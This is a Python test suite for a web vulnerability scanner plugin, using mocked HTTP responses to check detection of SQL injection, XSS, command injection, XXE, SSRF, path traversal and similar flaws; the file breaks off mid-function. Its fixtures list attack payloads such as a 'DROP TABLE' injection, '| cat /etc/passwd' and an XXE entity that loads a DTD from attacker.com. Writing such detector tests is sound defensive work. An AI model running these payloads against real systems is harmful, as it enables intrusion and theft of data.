"""
Test suite for the Vulnerability Scanner Plugin.

This module contains comprehensive tests for the VulnScannerPlugin, covering:

Test Categories:
1. Basic Functionality
   - Plugin initialization and configuration
   - Plugin cleanup and resource management
   - Session handling and SSL verification
   - Configuration validation
   - Plugin state management

2. Vulnerability Detection
   - SQL Injection detection and validation
   - XSS (Cross-Site Scripting) detection
   - Open Redirect detection
   - File Inclusion detection
   - Command Injection detection
   - SSRF (Server-Side Request Forgery) detection
   - XXE (XML External Entity) detection
   - CSRF (Cross-Site Request Forgery) detection
   - Path Traversal detection
   - Template Injection detection

3. Finding Management
   - Finding creation and validation
   - Finding storage and updates
   - Finding metadata and evidence handling
   - Finding severity and confidence scoring
   - Finding deduplication
   - Finding status management
   - Finding evidence collection

4. Error Handling
   - Network error handling
   - Database error handling
   - Invalid response handling
   - Timeout handling
   - SSL/TLS error handling
   - Rate limit handling
   - Malformed response handling
   - Connection pool exhaustion

5. Performance
   - Concurrent request handling
   - Resource usage optimization
   - Timeout management
   - Rate limiting compliance
   - Memory usage monitoring
   - Connection pool management
   - Request batching
   - Response caching

6. Resource Management
   - Session cleanup
   - Memory usage optimization
   - Connection pooling
   - Resource leak prevention
   - File handle management
   - Database connection management
   - Cache management

7. Integration
   - Database integration
   - HTTP client integration
   - Configuration management
   - Plugin lifecycle management
   - Finding service integration
   - Logging integration
   - Metrics collection
"""

import asyncio
import pytest
from datetime import datetime
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch, AsyncMock
from bs4 import BeautifulSoup
import aiohttp
from aiohttp import ClientResponse, ClientSession
import json
from urllib.parse import urlparse

from bbf.plugins.vuln.scanner import VulnScannerPlugin, VulnResult, PluginError
from bbf.core.database.models import VulnerabilityFinding, Finding
from bbf.core.database.service import finding_service

# Test Configuration
TEST_CONFIG = {
    # Timeouts and Limits
    'timeout': 10.0,
    'max_redirects': 5,
    'max_concurrent_requests': 10,
    'retry_count': 3,
    'retry_delay': 1.0,
    'rate_limit': 10,  # requests per second
    'scan_depth': 3,
    
    # Security Settings
    'verify_ssl': True,
    'follow_redirects': True,
    'allow_insecure': False,
    
    # Detection Settings
    'confidence_threshold': 0.7,
    'severity_threshold': 'medium',
    'min_evidence_length': 10,
    'max_evidence_length': 1000,
    
    # Performance Settings
    'connection_pool_size': 20,
    'connection_timeout': 5.0,
    'keep_alive_timeout': 30.0,
    'max_retries': 3,
    
    # Resource Settings
    'max_memory_usage': 512 * 1024 * 1024,  # 512MB
    'max_file_handles': 1000,
    'max_db_connections': 10,
    
    # Cache Settings
    'cache_enabled': True,
    'cache_ttl': 3600,  # 1 hour
    'max_cache_size': 100 * 1024 * 1024  # 100MB
}

# Test Data
TEST_URL = "https://example.com"
TEST_DOMAIN = "example.com"
TEST_SUBDOMAIN = "example"

# Test Headers
TEST_HEADERS = {
    'User-Agent': 'BBF Scanner/1.0.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}

# Test HTML Templates
TEST_HTML_TEMPLATES = {
    'login_form': """
    <form action="/login" method="POST">
        <input type="text" name="username">
        <input type="password" name="password">
        <input type="submit" value="Login">
    </form>
    """,
    'search_form': """
    <form action="/search" method="GET">
        <input type="text" name="q">
        <input type="submit" value="Search">
    </form>
    """,
    'upload_form': """
    <form action="/upload" method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    """,
    'redirect_link': '<a href="/redirect?url=test">Click here</a>',
    'download_link': '<a href="/download?file=document.pdf">Download</a>',
    'proxy_link': '<a href="/proxy?url=test">Proxy</a>',
    'csrf_form': """
    <form action="/transfer" method="POST">
        <input type="hidden" name="csrf_token" value="abc123">
        <input type="text" name="amount">
        <input type="submit" value="Transfer">
    </form>
    """,
    'template_injection': """
    <div>{{ user_input }}</div>
    <div>{% include user_input %}</div>
    """,
    'path_traversal': """
    <a href="/download?file=../../etc/passwd">Download</a>
    <img src="/images?path=../../../etc/shadow">
    """
}

# Test Response Templates
TEST_RESPONSES = {
    'sql_error': "MySQL Error: You have an error in your SQL syntax",
    'xss_reflected': "<div>Search results for: <script>alert(1)</script></div>",
    'file_inclusion': "root:x:0:0:root:/root:/bin/bash",
    'command_output': "uid=1000(user) gid=1000(user) groups=1000(user)",
    'ssrf_detected': "SSRF detected",
    'xxe_detected': "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    'csrf_error': "Invalid CSRF token",
    'template_error': "Template syntax error: {{ user_input }}",
    'path_traversal': "root:x:0:0:root:/root:/bin/bash",
    'rate_limit': "Rate limit exceeded. Please try again later.",
    'timeout': "Request timed out",
    'ssl_error': "SSL handshake failed",
    'connection_error': "Connection refused",
    'malformed_response': "<html><body>Invalid response",
    'empty_response': "",
    'large_response': "A" * 1000000  # 1MB response
}

# Expected Test Results
EXPECTED_RESULTS = {
    'sql_injection': {
        'type': 'sql_injection',
        'severity': 'high',
        'confidence': 0.9,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'error_message',
        'requires_validation': True
    },
    'xss': {
        'type': 'xss',
        'severity': 'high',
        'confidence': 0.9,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'reflected_content',
        'requires_validation': True
    },
    'open_redirect': {
        'type': 'open_redirect',
        'severity': 'medium',
        'confidence': 0.8,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'redirect_location',
        'requires_validation': True
    },
    'file_inclusion': {
        'type': 'file_inclusion',
        'severity': 'critical',
        'confidence': 0.95,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'file_content',
        'requires_validation': True
    },
    'command_injection': {
        'type': 'command_injection',
        'severity': 'critical',
        'confidence': 0.95,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'command_output',
        'requires_validation': True
    },
    'ssrf': {
        'type': 'ssrf',
        'severity': 'high',
        'confidence': 0.85,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'response_content',
        'requires_validation': True
    },
    'xxe': {
        'type': 'xxe',
        'severity': 'critical',
        'confidence': 0.9,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'xml_content',
        'requires_validation': True
    },
    'csrf': {
        'type': 'csrf',
        'severity': 'high',
        'confidence': 0.8,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'token_validation',
        'requires_validation': True
    },
    'template_injection': {
        'type': 'template_injection',
        'severity': 'high',
        'confidence': 0.85,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'template_output',
        'requires_validation': True
    },
    'path_traversal': {
        'type': 'path_traversal',
        'severity': 'high',
        'confidence': 0.9,
        'stage': 'vuln',
        'status': 'active',
        'evidence_type': 'file_content',
        'requires_validation': True
    }
}

@pytest.fixture
def mock_session() -> AsyncMock:
    """Create a mock aiohttp session for testing.
    
    Returns:
        AsyncMock: A mock aiohttp ClientSession instance.
    """
    with patch('aiohttp.ClientSession') as mock:
        session = AsyncMock()
        mock.return_value = session
        yield session

@pytest.fixture
def mock_finding_service() -> AsyncMock:
    """Create a mock finding service for testing.
    
    Returns:
        AsyncMock: A mock finding service instance.
    """
    with patch('bbf.core.database.service.finding_service') as mock:
        mock.add_or_update_finding = AsyncMock()
        yield mock

@pytest.fixture
def mock_payloads() -> Dict[str, List[str]]:
    """Create mock payloads for vulnerability testing.
    
    Returns:
        Dict[str, List[str]]: A dictionary of vulnerability types and their test payloads.
    """
    return {
        'sql_injection': ["' OR '1'='1", "1' OR '1'='1", "1; DROP TABLE users"],
        'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        'open_redirect': ["//google.com", "https://attacker.com"],
        'file_inclusion': ["../../../etc/passwd", "file:///etc/passwd"],
        'command_injection': ["; ls -la", "| cat /etc/passwd"],
        'ssrf': ["http://localhost/", "http://127.0.0.1/"],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>'
        ]
    }

@pytest.fixture
def mock_error_patterns() -> Dict[str, List[str]]:
    """Create mock error patterns for vulnerability detection.
    
    Returns:
        Dict[str, List[str]]: A dictionary of vulnerability types and their error patterns.
    """
    return {
        'sql_injection': [
            r"SQL syntax.*MySQL",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"PostgreSQL.*ERROR"
        ],
        'xss': [
            r"<script>alert\(1\)</script>",
            r"<img src=x onerror=alert\(1\)>"
        ],
        'file_inclusion': [
            r"root:.*:0:0:",
            r"PHP Warning: include\(\)",
            r"Failed opening.*for inclusion"
        ],
        'command_injection': [
            r"root:.*:0:0:",
            r"uid=.*gid=.*groups=",
            r"total [0-9]+"
        ]
    }

@pytest.fixture
def plugin(mock_payloads: Dict[str, List[str]], 
          mock_error_patterns: Dict[str, List[str]]) -> VulnScannerPlugin:
    """Create a plugin instance with mocked dependencies.
    
    Args:
        mock_payloads: Mock payloads for testing.
        mock_error_patterns: Mock error patterns for testing.
        
    Returns:
        VulnScannerPlugin: A configured plugin instance.
    """
    with patch('bbf.plugins.config.get_payloads', return_value=mock_payloads), \
         patch('bbf.plugins.config.get_error_patterns', return_value=mock_error_patterns):
        plugin = VulnScannerPlugin()
        return plugin

class TestBasicFunctionality:
    """Test basic plugin functionality."""
    
    @pytest.mark.asyncio
    async def test_plugin_initialization(self, plugin: VulnScannerPlugin) -> None:
        """Test plugin initialization and configuration.
        
        Args:
            plugin: The plugin instance to test.
        """
        # Test basic attributes
        assert plugin.name == "vuln_scanner"
        assert plugin.description == "Vulnerability detection and analysis"
        assert plugin.version == "1.0.0"
        assert plugin.author == "BBF Team"
        
        # Test configuration
        assert plugin.timeout == TEST_CONFIG['timeout']
        assert plugin.max_redirects == TEST_CONFIG['max_redirects']
        assert plugin.max_concurrent_requests == TEST_CONFIG['max_concurrent_requests']
        assert plugin.verify_ssl == TEST_CONFIG['verify_ssl']
        assert plugin.retry_count == TEST_CONFIG['retry_count']
        assert plugin.retry_delay == TEST_CONFIG['retry_delay']
        assert plugin.rate_limit == TEST_CONFIG['rate_limit']
        assert plugin.scan_depth == TEST_CONFIG['scan_depth']
        
        # Test detection settings
        assert plugin.confidence_threshold == TEST_CONFIG['confidence_threshold']
        assert plugin.severity_threshold == TEST_CONFIG['severity_threshold']
        assert plugin.min_evidence_length == TEST_CONFIG['min_evidence_length']
        assert plugin.max_evidence_length == TEST_CONFIG['max_evidence_length']
        
        # Test resource settings
        assert plugin.max_memory_usage == TEST_CONFIG['max_memory_usage']
        assert plugin.max_file_handles == TEST_CONFIG['max_file_handles']
        assert plugin.max_db_connections == TEST_CONFIG['max_db_connections']
        
        # Test cache settings
        assert plugin.cache_enabled == TEST_CONFIG['cache_enabled']
        assert plugin.cache_ttl == TEST_CONFIG['cache_ttl']
        assert plugin.max_cache_size == TEST_CONFIG['max_cache_size']
        
        # Test payloads and patterns
        assert plugin.payloads == mock_payloads
        assert plugin.error_patterns == mock_error_patterns

    @pytest.mark.asyncio
    async def test_plugin_cleanup(self, plugin: VulnScannerPlugin, 
                                mock_session: AsyncMock) -> None:
        """Test plugin cleanup and resource management.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Initialize plugin
        await plugin.initialize()
        assert plugin.session is not None
        
        # Test session cleanup
        await plugin.cleanup()
        assert plugin.session is None
        mock_session.close.assert_called_once()
        
        # Test multiple cleanup calls
        await plugin.cleanup()  # Should not raise any errors
        mock_session.close.assert_called_once()  # Should not be called again
        
        # Test cleanup with no session
        plugin.session = None
        await plugin.cleanup()  # Should not raise any errors

    @pytest.mark.asyncio
    async def test_plugin_state_management(self, plugin: VulnScannerPlugin) -> None:
        """Test plugin state management.
        
        Args:
            plugin: The plugin instance to test.
        """
        # Test initial state
        assert not plugin.is_initialized
        assert plugin.session is None
        assert plugin.findings == []
        
        # Test initialization
        await plugin.initialize()
        assert plugin.is_initialized
        assert plugin.session is not None
        
        # Test state after cleanup
        await plugin.cleanup()
        assert not plugin.is_initialized
        assert plugin.session is None
        
        # Test re-initialization
        await plugin.initialize()
        assert plugin.is_initialized
        assert plugin.session is not None

class TestVulnerabilityDetection:
    """Test vulnerability detection functionality."""
    
    @pytest.mark.asyncio
    async def test_sql_injection_detection(self, plugin: VulnScannerPlugin, 
                                         mock_session: AsyncMock) -> None:
        """Test SQL injection detection and validation.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different SQL injection scenarios
        test_cases = [
            {
                'form': TEST_HTML_TEMPLATES['login_form'],
                'response': TEST_RESPONSES['sql_error'],
                'url': f"{TEST_URL}/login",
                'parameter': 'username',
                'expected_type': 'sql_injection'
            },
            {
                'form': TEST_HTML_TEMPLATES['search_form'],
                'response': "PostgreSQL Error: syntax error",
                'url': f"{TEST_URL}/search",
                'parameter': 'q',
                'expected_type': 'sql_injection'
            },
            {
                'form': TEST_HTML_TEMPLATES['upload_form'],
                'response': "ORA-00936: missing expression",
                'url': f"{TEST_URL}/upload",
                'parameter': 'file',
                'expected_type': 'sql_injection'
            }
        ]
        
        for test_case in test_cases:
            # Mock response
            mock_response = AsyncMock()
            mock_response.text = AsyncMock(return_value=test_case['response'])
            mock_response.url = test_case['url']
            mock_session.get.return_value.__aenter__.return_value = mock_response
            
            # Create test form
            form = BeautifulSoup(test_case['form'], 'html.parser').find('form')
            
            # Test detection
            result = await plugin._scan_form_sql_injection(form, test_case['url'])
            assert result is not None
            assert result.type == EXPECTED_RESULTS[test_case['expected_type']]['type']
            assert result.severity == EXPECTED_RESULTS[test_case['expected_type']]['severity']
            assert result.url == test_case['url']
            assert result.parameter == test_case['parameter']
            assert result.payload in mock_payloads['sql_injection']
            assert result.stage == EXPECTED_RESULTS[test_case['expected_type']]['stage']
            assert result.status == EXPECTED_RESULTS[test_case['expected_type']]['status']
            assert result.evidence == test_case['response']
            assert result.confidence >= TEST_CONFIG['confidence_threshold']

    @pytest.mark.asyncio
    async def test_xss_detection(self, plugin: VulnScannerPlugin, 
                               mock_session: AsyncMock) -> None:
        """Test XSS detection and validation.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different XSS scenarios
        test_cases = [
            {
                'form': TEST_HTML_TEMPLATES['search_form'],
                'response': TEST_RESPONSES['xss_reflected'],
                'url': f"{TEST_URL}/search",
                'parameter': 'q',
                'expected_type': 'xss'
            },
            {
                'form': TEST_HTML_TEMPLATES['login_form'],
                'response': '<div>Welcome <img src=x onerror=alert(1)></div>',
                'url': f"{TEST_URL}/login",
                'parameter': 'username',
                'expected_type': 'xss'
            },
            {
                'form': TEST_HTML_TEMPLATES['upload_form'],
                'response': '<div>File: <script>alert(document.cookie)</script></div>',
                'url': f"{TEST_URL}/upload",
                'parameter': 'file',
                'expected_type': 'xss'
            }
        ]
        
        for test_case in test_cases:
            # Mock response
            mock_response = AsyncMock()
            mock_response.text = AsyncMock(return_value=test_case['response'])
            mock_response.url = test_case['url']
            mock_session.get.return_value.__aenter__.return_value = mock_response
            
            # Create test form
            form = BeautifulSoup(test_case['form'], 'html.parser').find('form')
            
            # Test detection
            result = await plugin._scan_form_xss(form, test_case['url'])
            assert result is not None
            assert result.type == EXPECTED_RESULTS[test_case['expected_type']]['type']
            assert result.severity == EXPECTED_RESULTS[test_case['expected_type']]['severity']
            assert result.url == test_case['url']
            assert result.parameter == test_case['parameter']
            assert result.payload in mock_payloads['xss']
            assert result.stage == EXPECTED_RESULTS[test_case['expected_type']]['stage']
            assert result.status == EXPECTED_RESULTS[test_case['expected_type']]['status']
            assert result.evidence == test_case['response']
            assert result.confidence >= TEST_CONFIG['confidence_threshold']

    @pytest.mark.asyncio
    async def test_csrf_detection(self, plugin: VulnScannerPlugin,
                                mock_session: AsyncMock) -> None:
        """Test CSRF detection and validation.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different CSRF scenarios
        test_cases = [
            {
                'form': TEST_HTML_TEMPLATES['csrf_form'],
                'response': TEST_RESPONSES['csrf_error'],
                'url': f"{TEST_URL}/transfer",
                'parameter': 'csrf_token',
                'expected_type': 'csrf'
            },
            {
                'form': TEST_HTML_TEMPLATES['login_form'],
                'response': "Missing CSRF token",
                'url': f"{TEST_URL}/login",
                'parameter': None,
                'expected_type': 'csrf'
            }
        ]
        
        for test_case in test_cases:
            # Mock response
            mock_response = AsyncMock()
            mock_response.text = AsyncMock(return_value=test_case['response'])
            mock_response.url = test_case['url']
            mock_session.post.return_value.__aenter__.return_value = mock_response
            
            # Create test form
            form = BeautifulSoup(test_case['form'], 'html.parser').find('form')
            
            # Test detection
            result = await plugin._scan_form_csrf(form, test_case['url'])
            assert result is not None
            assert result.type == EXPECTED_RESULTS[test_case['expected_type']]['type']
            assert result.severity == EXPECTED_RESULTS[test_case['expected_type']]['severity']
            assert result.url == test_case['url']
            if test_case['parameter']:
                assert result.parameter == test_case['parameter']
            assert result.stage == EXPECTED_RESULTS[test_case['expected_type']]['stage']
            assert result.status == EXPECTED_RESULTS[test_case['expected_type']]['status']
            assert result.evidence == test_case['response']
            assert result.confidence >= TEST_CONFIG['confidence_threshold']

    @pytest.mark.asyncio
    async def test_template_injection_detection(self, plugin: VulnScannerPlugin,
                                             mock_session: AsyncMock) -> None:
        """Test template injection detection and validation.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different template injection scenarios
        test_cases = [
            {
                'form': TEST_HTML_TEMPLATES['template_injection'],
                'response': TEST_RESPONSES['template_error'],
                'url': f"{TEST_URL}/template",
                'parameter': 'user_input',
                'expected_type': 'template_injection'
            },
            {
                'form': TEST_HTML_TEMPLATES['search_form'],
                'response': "Template syntax error: {{ 7 * 7 }}",
                'url': f"{TEST_URL}/search",
                'parameter': 'q',
                'expected_type': 'template_injection'
            }
        ]
        
        for test_case in test_cases:
            # Mock response
            mock_response = AsyncMock()
            mock_response.text = AsyncMock(return_value=test_case['response'])
            mock_response.url = test_case['url']
            mock_session.get.return_value.__aenter__.return_value = mock_response
            
            # Create test form
            form = BeautifulSoup(test_case['form'], 'html.parser').find('form')
            
            # Test detection
            result = await plugin._scan_form_template_injection(form, test_case['url'])
            assert result is not None
            assert result.type == EXPECTED_RESULTS[test_case['expected_type']]['type']
            assert result.severity == EXPECTED_RESULTS[test_case['expected_type']]['severity']
            assert result.url == test_case['url']
            assert result.parameter == test_case['parameter']
            assert result.stage == EXPECTED_RESULTS[test_case['expected_type']]['stage']
            assert result.status == EXPECTED_RESULTS[test_case['expected_type']]['status']
            assert result.evidence == test_case['response']
            assert result.confidence >= TEST_CONFIG['confidence_threshold']

@pytest.mark.asyncio
async def test_open_redirect_detection(plugin, mock_session):
    """Test open redirect detection."""
    # Mock response
    mock_response = AsyncMock()
    mock_response.url = "https://google.com"
    mock_session.get.return_value.__aenter__.return_value = mock_response
    
    # Create test link
    link_html = '<a href="/redirect?url=test">Click here</a>'
    link = BeautifulSoup(link_html, 'html.parser').find('a')
    
    # Test detection
    result = await plugin._scan_link_open_redirect(link, "http://example.com")
    assert result is not None
    assert result.type == "open_redirect"
    assert result.severity == "medium"
    assert result.url == "http://example.com/redirect"
    assert result.parameter == "url"
    assert result.payload == "//google.com"
    assert result.stage == "vuln"
    assert result.status == "active"

@pytest.mark.asyncio
async def test_file_inclusion_detection(plugin, mock_session):
    """Test file inclusion detection."""
    # Mock response
    mock_response = AsyncMock()
    mock_response.text = AsyncMock(return_value="root:x:0:0:root:/root:/bin/bash")
    mock_response.url = "http://example.com/include"
    mock_session.get.return_value.__aenter__.return_value = mock_response
    
    # Create test link
    link_html = '<a href="/include?file=test">Include file</a>'
    link = BeautifulSoup(link_html, 'html.parser').find('a')
    
    # Test detection
    result = await plugin._scan_link_file_inclusion(link, "http://example.com")
    assert result is not None
    assert result.type == "file_inclusion"
    assert result.severity == "critical"
    assert result.url == "http://example.com/include"
    assert result.parameter == "file"
    assert result.payload == "../../../etc/passwd"
    assert result.stage == "vuln"
    assert result.status == "active"

@pytest.mark.asyncio
async def test_command_injection_detection(plugin, mock_session):
    """Test command injection detection."""
    # Mock response
    mock_response = AsyncMock()
    mock_response.text = AsyncMock(return_value="root:x:0:0:root:/root:/bin/bash")
    mock_response.url = "http://example.com/exec"
    mock_session.get.return_value.__aenter__.return_value = mock_response
    
    # Create test form
    form_html = """
    <form action="/exec" method="POST">
        <input type="text" name="cmd">
        <input type="submit" value="Execute">
    </form>
    """
    form = BeautifulSoup(form_html, 'html.parser').find('form')
    
    # Test detection
    result = await plugin._scan_form_command_injection(form, "http://example.com")
    assert result is not None
    assert result.type == "command_injection"
    assert result.severity == "critical"
    assert result.url == "http://example.com/exec"
    assert result.parameter == "cmd"
    assert result.payload == "; ls -la"
    assert result.stage == "vuln"
    assert result.status == "active"

@pytest.mark.asyncio
async def test_ssrf_detection(plugin, mock_session):
    """Test SSRF detection."""
    # Mock response
    mock_response = AsyncMock()
    mock_response.text = AsyncMock(return_value="SSRF detected")
    mock_response.url = "http://example.com/fetch"
    mock_session.get.return_value.__aenter__.return_value = mock_response
    
    # Create test link
    link_html = '<a href="/fetch?url=test">Fetch URL</a>'
    link = BeautifulSoup(link_html, 'html.parser').find('a')
    
    # Test detection
    result = await plugin._scan_link_ssrf(link, "http://example.com")
    assert result is not None
    assert result.type == "ssrf"
    assert result.severity == "high"
    assert result.url == "http://example.com/fetch"
    assert result.parameter == "url"
    assert result.payload == "http://localhost/"
    assert result.stage == "vuln"
    assert result.status == "active"

class TestFindingManagement:
    """Test finding management functionality."""
    
    @pytest.mark.asyncio
    async def test_store_findings(self, plugin: VulnScannerPlugin, 
                                mock_finding_service: AsyncMock) -> None:
        """Test finding storage and updates.
        
        Args:
            plugin: The plugin instance to test.
            mock_finding_service: Mock finding service.
        """
        # Create test findings
        findings = [
            {
                'url': f"{TEST_URL}/login",
                'type': 'sql_injection',
                'severity': 'high',
                'description': 'SQL injection vulnerability',
                'evidence': TEST_RESPONSES['sql_error'],
                'payload': mock_payloads['sql_injection'][0],
                'parameter': 'username',
                'confidence': EXPECTED_RESULTS['sql_injection']['confidence'],
                'timestamp': datetime.utcnow(),
                'stage': EXPECTED_RESULTS['sql_injection']['stage'],
                'status': EXPECTED_RESULTS['sql_injection']['status']
            },
            {
                'url': f"{TEST_URL}/search",
                'type': 'xss',
                'severity': 'high',
                'description': 'XSS vulnerability',
                'evidence': TEST_RESPONSES['xss_reflected'],
                'payload': mock_payloads['xss'][0],
                'parameter': 'q',
                'confidence': EXPECTED_RESULTS['xss']['confidence'],
                'timestamp': datetime.utcnow(),
                'stage': EXPECTED_RESULTS['xss']['stage'],
                'status': EXPECTED_RESULTS['xss']['status']
            }
        ]
        
        # Store findings
        await plugin._store_findings(TEST_URL, findings)
        
        # Verify finding service call
        mock_finding_service.add_or_update_finding.assert_called_once()
        call_args = mock_finding_service.add_or_update_finding.call_args[1]
        finding_data = call_args['finding_data']
        
        assert finding_data['root_domain'] == TEST_DOMAIN
        assert finding_data['subdomain'] == TEST_SUBDOMAIN
        assert finding_data['source'] == 'vulnerability_scan'
        assert finding_data['stage'] == 'vuln'
        assert finding_data['status'] == 'active'
        
        metadata = json.loads(finding_data['metadata'])
        assert metadata['scan_type'] == 'comprehensive'
        assert metadata['vulnerabilities_found'] == len(findings)
        assert all(vuln_type in metadata['vulnerabilities_by_type'] 
                  for vuln_type in ['sql_injection', 'xss'])
        assert 'scan_timestamp' in metadata
        assert 'scan_details' in metadata

    @pytest.mark.asyncio
    async def test_store_findings_error(self, plugin: VulnScannerPlugin, 
                                      mock_finding_service: AsyncMock) -> None:
        """Test error handling when storing findings.
        
        Args:
            plugin: The plugin instance to test.
            mock_finding_service: Mock finding service.
        """
        # Mock finding service to raise an error
        mock_finding_service.add_or_update_finding.side_effect = Exception("Database error")
        
        # Create test findings
        findings = [
            {
                'url': f"{TEST_URL}/login",
                'type': 'sql_injection',
                'severity': 'high',
                'description': 'SQL injection vulnerability',
                'evidence': TEST_RESPONSES['sql_error'],
                'payload': mock_payloads['sql_injection'][0],
                'parameter': 'username',
                'confidence': EXPECTED_RESULTS['sql_injection']['confidence'],
                'timestamp': datetime.utcnow(),
                'stage': EXPECTED_RESULTS['sql_injection']['stage'],
                'status': EXPECTED_RESULTS['sql_injection']['status']
            }
        ]
        
        # Test error handling
        with pytest.raises(PluginError) as exc_info:
            await plugin._store_findings(TEST_URL, findings)
        assert "Failed to store findings in database" in str(exc_info.value)

class TestErrorHandling:
    """Test error handling functionality."""
    
    @pytest.mark.asyncio
    async def test_network_error_handling(self, plugin: VulnScannerPlugin, 
                                        mock_session: AsyncMock) -> None:
        """Test handling of network errors.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different network error scenarios
        error_cases = [
            (aiohttp.ClientError("Network error"), "Network error occurred"),
            (aiohttp.ServerDisconnectedError(), "Server disconnected"),
            (aiohttp.ClientConnectorError(None, None), "Connection failed"),
            (aiohttp.ClientOSError(), "OS error occurred"),
            (aiohttp.ClientPayloadError(), "Payload error occurred")
        ]
        
        for error, expected_message in error_cases:
            # Mock session to raise network error
            mock_session.get.side_effect = error
            
            # Execute plugin
            results = await plugin.execute(TEST_URL)
            assert results == []
            mock_finding_service.add_or_update_finding.assert_not_called()
            
            # Verify error logging
            assert any(expected_message in str(log) for log in plugin.logs)

    @pytest.mark.asyncio
    async def test_timeout_handling(self, plugin: VulnScannerPlugin, 
                                  mock_session: AsyncMock) -> None:
        """Test handling of request timeouts.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different timeout scenarios
        timeout_cases = [
            (asyncio.TimeoutError("Request timeout"), "Request timed out"),
            (aiohttp.ClientTimeout("Connection timeout"), "Connection timed out"),
            (aiohttp.ServerTimeoutError("Server timeout"), "Server timed out")
        ]
        
        for error, expected_message in timeout_cases:
            # Mock session to raise timeout
            mock_session.get.side_effect = error
            
            # Execute plugin
            results = await plugin.execute(TEST_URL)
            assert results == []
            mock_finding_service.add_or_update_finding.assert_not_called()
            
            # Verify error logging
            assert any(expected_message in str(log) for log in plugin.logs)

    @pytest.mark.asyncio
    async def test_ssl_error_handling(self, plugin: VulnScannerPlugin, 
                                    mock_session: AsyncMock) -> None:
        """Test handling of SSL/TLS errors.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different SSL error scenarios
        ssl_cases = [
            (aiohttp.ClientSSLError("SSL error"), "SSL handshake failed"),
            (aiohttp.ServerFingerprintMismatch(None, None, None), "SSL certificate mismatch"),
            (aiohttp.ServerCertificateError(), "Invalid SSL certificate")
        ]
        
        for error, expected_message in ssl_cases:
            # Mock session to raise SSL error
            mock_session.get.side_effect = error
            
            # Execute plugin
            results = await plugin.execute(TEST_URL)
            assert results == []
            mock_finding_service.add_or_update_finding.assert_not_called()
            
            # Verify error logging
            assert any(expected_message in str(log) for log in plugin.logs)

    @pytest.mark.asyncio
    async def test_rate_limit_handling(self, plugin: VulnScannerPlugin,
                                     mock_session: AsyncMock) -> None:
        """Test handling of rate limiting.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Mock response for rate limit
        mock_response = AsyncMock()
        mock_response.status = 429
        mock_response.text = AsyncMock(return_value=TEST_RESPONSES['rate_limit'])
        mock_session.get.return_value.__aenter__.return_value = mock_response
        
        # Execute plugin
        results = await plugin.execute(TEST_URL)
        assert results == []
        mock_finding_service.add_or_update_finding.assert_not_called()
        
        # Verify rate limit handling
        assert any("Rate limit exceeded" in str(log) for log in plugin.logs)
        assert plugin.current_rate >= 0
        assert plugin.current_rate <= TEST_CONFIG['rate_limit']

    @pytest.mark.asyncio
    async def test_malformed_response_handling(self, plugin: VulnScannerPlugin,
                                            mock_session: AsyncMock) -> None:
        """Test handling of malformed responses.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Test different malformed response scenarios
        response_cases = [
            (TEST_RESPONSES['malformed_response'], "Invalid response format"),
            (TEST_RESPONSES['empty_response'], "Empty response received"),
            (TEST_RESPONSES['large_response'], "Response too large")
        ]
        
        for response, expected_message in response_cases:
            # Mock response
            mock_response = AsyncMock()
            mock_response.text = AsyncMock(return_value=response)
            mock_session.get.return_value.__aenter__.return_value = mock_response
            
            # Execute plugin
            results = await plugin.execute(TEST_URL)
            assert results == []
            mock_finding_service.add_or_update_finding.assert_not_called()
            
            # Verify error logging
            assert any(expected_message in str(log) for log in plugin.logs)

class TestPerformance:
    """Test performance and resource management."""
    
    @pytest.mark.asyncio
    async def test_concurrent_scanning(self, plugin: VulnScannerPlugin, 
                                     mock_session: AsyncMock) -> None:
        """Test concurrent vulnerability scanning.
        
        Args:
            plugin: The plugin instance to test.
            mock_session: Mock aiohttp session.
        """
        # Mock responses for concurrent requests
        mock_responses = {
            '/login': TEST_RESPONSES['sql_error'],
            '/search': TEST_RESPONSES['xss_reflected'],
            '/redirect': "https://google.com",
            '/include': TEST_RESPONSES['file_inclusion'],
            '/exec': TEST_RESPONSES['command_output'],
            '/fetch': TEST_RESPONSES['ssrf_detected'],
            '/template': TEST_RESPONSES['template_error'],
            '/csrf': TEST_RESPONSES['csrf_error']
        }
        
        async def mock_get(*args: Any, **kwargs: Any) -> AsyncMock:
